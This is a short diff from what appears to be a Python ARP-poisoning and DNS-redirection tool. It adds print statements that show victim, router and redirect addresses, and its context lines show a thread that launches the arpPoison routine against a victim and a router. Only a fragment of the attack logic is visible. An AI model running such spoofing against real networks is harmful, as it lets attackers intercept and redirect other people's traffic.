@@ -138,6 +138,12 @@ def main(args):
         elif redirect is not None:
             redirectIP = str(redirect)
 
+    # Print the user input
+    print("Victim IP: {} Victim MAC: {}".format(victimIP, victimMAC))
+    print("Router IP: {} Router MAC: {}".format(routerIP, routerMAC))
+    print("Forwarding DNS requests to: {}".format(redirectIP))
+
+    # Main functionalities
     setup()
     arpThread = threading.Thread(target=arpPoison, args=(routerIP, victimIP, routerMAC, victimMAC))
     arpThread.daemon = True
